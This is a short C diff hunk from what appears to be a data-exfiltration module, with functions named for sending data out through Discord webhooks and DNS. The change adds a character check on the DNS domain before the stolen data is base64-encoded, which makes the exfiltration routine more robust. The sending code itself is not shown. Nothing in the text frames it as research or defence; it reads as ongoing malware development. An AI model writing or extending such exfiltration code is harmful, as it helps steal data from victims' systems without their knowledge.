@@ -62,6 +62,13 @@ bool jocky_exfil_discord(const char* webhook, int8_t* data, int32_t size) {
 bool jocky_exfil_dns(const char* domain, int8_t* data, int32_t size) {
     if (!domain || !data || size <= 0) return false;
 
+    for (const char* p = domain; *p; p++) {
+        if (!(*p >= 'a' && *p <= 'z') && !(*p >= 'A' && *p <= 'Z') &&
+            !(*p >= '0' && *p <= '9') && *p != '.' && *p != '-') {
+            return false;
+        }
+    }
+
     char* b64 = base64_encode((const uint8_t*)data, size);
     if (!b64) return false;
 
